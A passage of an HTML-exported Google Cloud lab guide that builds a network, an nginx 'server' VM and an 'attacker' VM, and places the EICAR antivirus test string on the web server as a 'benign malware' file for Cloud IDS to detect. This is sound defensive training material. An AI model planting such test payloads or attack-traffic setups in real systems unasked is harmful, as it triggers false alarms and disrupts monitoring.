0.1px;">--target-tags=server</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 180px;"></div><div class="CodeMirror-gutters" style="display: none; height: 180px;"></div></div></div></pre><p>&nbsp;</p><ol start='' ><li><p><span>Create the allow-iap-proxy rule:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud compute firewall-rules create allow-iap-proxy \</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">--direction=INGRESS \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">--priority=1000 \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">--network=cloud-ids \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">--action=ALLOW \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">--rules=tcp:22 \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">--source-ranges=35.235.240.0/20</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 158px;"></div><div class="CodeMirror-gutters" style="display: none; height: 158px;"></div></div></div></pre><p>&nbsp;</p><p><span>Click </span><em><span>Check my progress</span></em><span> to verify the objective.</span></p><p><span>Add firewall rules to the VPC.</span></p><p>&nbsp;</p><ol start='' ><li><p><span>To create a Cloud Router, run the following command:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud compute routers create cr-cloud-ids-useast1 \</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">--region=us-east1 \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">--network=cloud-ids</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 68px;"></div><div class="CodeMirror-gutters" style="display: none; height: 68px;"></div></div></div></pre><p>&nbsp;</p><ol start='' ><li><p><span>To configure a Cloud NAT, run the following command:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud compute routers nats create nat-cloud-ids-useast1 \</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">--router=cr-cloud-ids-useast1 \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">--router-region=us-east1 \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">--auto-allocate-nat-external-ips \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">--nat-all-subnet-ip-ranges</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 113px;"></div><div class="CodeMirror-gutters" style="display: none; height: 113px;"></div></div></div></pre><p>&nbsp;</p><p><span>Click </span><em><span>Check my progress</span></em><span> to verify the objective.</span></p><p><span>Create a Cloud Router.</span></p><p>&nbsp;</p><h4 id='task-5-create-two-virtual-machines'><span>Task 5. Create two virtual machines</span></h4><p><span>In this task, you create two virtual machines (VMs). The first virtual machine is your web server, which is mirroring to Cloud IDS. The second virtual machine is the source of your attack traffic.</span></p><p><span>You establish an SSH connection to your server via Identity-Aware Proxy (IAP), check the status of your web service server, create a benign malware file on the web server, and then add content to the file.</span></p><ol start='' ><li><p><span>To create a virtual machine to be a server mirroring to Cloud IDS, in Cloud Shell, run the following command:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud compute instances create server \</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">--zone=us-east1-b \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">--machine-type=e2-medium \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">--subnet=cloud-ids-useast1 \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">--no-address \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">--private-network-ip=192.168.10.20 \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">--metadata=startup-script=\#\!\ /bin/bash$'\n'sudo\ apt-get\ update$'\n'sudo\ apt-get\ -qq\ -y\ install\ nginx \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">--tags=server \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">--image=debian-11-bullseye-v20240709 \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">--image-project=debian-cloud \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">--boot-disk-size=10GB</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 270px;"></div><div class="CodeMirror-gutters" style="display: none; height: 270px;"></div></div></div></pre><p>&nbsp;</p><p><span>This command creates a Debian server in us-east1 and installs a simple web service.</span></p><ol start='' ><li><p><span>Create a virtual machine to be a client sending attack traffic:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud compute instances create attacker \</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">--zone=us-east1-b \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">--machine-type=e2-medium \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">--subnet=cloud-ids-useast1 \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">--no-address \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">--private-network-ip=192.168.10.10 \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">--image=debian-11-bullseye-v20240709 \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">--image-project=debian-cloud \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">--boot-disk-size=10GB</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 203px;"></div><div class="CodeMirror-gutters" style="display: none; height: 203px;"></div></div></div></pre><p>&nbsp;</p><p><span>This command prepares a Debian server in us-east1 to use as your client.</span></p><p><span>Click </span><em><span>Check my progress</span></em><span> to verify the objective.</span></p><p><span>Create a virtual machine.</span></p><p>&nbsp;</p><h5 id='prepare-your-server'><span>Prepare your server</span></h5><p><span>In this procedure, you validate your server and then create a benign malware payload for your client.</span></p><ol start='' ><li><p><span>To establish an SSH connection to your server via IAP, run the following command:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud compute ssh server --zone=us-east1-b --tunnel-through-iap</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p>&nbsp;</p><p><span>This command will prompt you through a series of steps to create an ssh key and the required directories.</span></p><ol start='' ><li><p><span>To agree to the directory creation prompt, type </span><strong><span>Y</span></strong><span>.</span></p></li><li><p><span>When prompted for a passphrase, to use a blank passphrase, press ENTER twice.</span></p></li></ol><p><span>You are now in the shell of your server VM.</span></p><h5 id='confirm-that-the-web-service-is-running'><span>Confirm that the web service is running</span></h5><p><span>In this procedure, you check the status of your web service server. You create a benign malware file on the web server and then add content to the file.</span></p><ol start='' ><li><p><span>To check the status of your web service, run the following Linux command:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">sudo systemctl status nginx</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p>&nbsp;</p><p><span>The output should be similar to this:</span></p><p><span>Command Output</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang="" style="break-inside: unset;"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> ● nginx.service - A high performance web server and a reverse proxy server</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; Loaded: loaded (/lib/systemd/system/nginx.service; enabled; vendor preset: enabled)</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; Active: active (running) since Tue 2021-05-25 18:01:49 UTC; 5h 24 min ago</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; Docs: man:nginx(8)</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; Main PID: 1347 (nginx)</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; Tasks: 3 (limit: 4665)</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; Memory: 4.5M</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; CGroup: /system.slice/nginx.service</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ├─1347 nginx: master process /usr/sbin/nginx -g daemon on; master_process on;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ├─1348 nginx: worker process</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; └─1349 nginx: worker process</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; May 25 18:01:49 server systemd[1]: Starting A high performance web server and a reverse proxy server...</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; May 25 18:01:49 server systemd[1]: Started A high performance web server and a reverse proxy server. &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 338px;"></div><div class="CodeMirror-gutters" style="display: none; height: 338px;"></div></div></div></pre><ol start='' ><li><p><span>Change directory to the web service:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">cd /var/www/html/</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p>&nbsp;</p><ol start='' ><li><p><span>Create a benign malware file on the web server. Run the following Linux command to create a text file:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">sudo touch eicar.file</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p>&nbsp;</p><ol start='' ><li><p><span>Add the following content to the newly created file:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">echo 'X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*' | sudo tee eicar.file</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p>&nbsp;</p><ol start='' ><li><p><span>Exit the server VM shell and return to Cloud Shell:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">exit</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p>&nbsp;</p><h4 id='task-6-create-a-cloud-ids-packet-mirroring-policy'><span>Task 6. Create a Cloud IDS packet mirroring policy</span></h4><p><span>In this task, you create a Cloud IDS packet mirroring policy. This policy determines what traffic is mirrored to the Cloud IDS. You will then attach this policy to the newly created Cloud IDS endpoint.</span></p><p><span>As mentioned earlier, the Cloud IDS endpoint creation takes some time. Before you can proceed with this lab, the endpoint must be in an active/ready state.</span></p><p><span>1.To verify that your Cloud IDS endpoint is active, in Cloud Shell, run the following command to show the current state of the Cloud IDS endpoint:</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 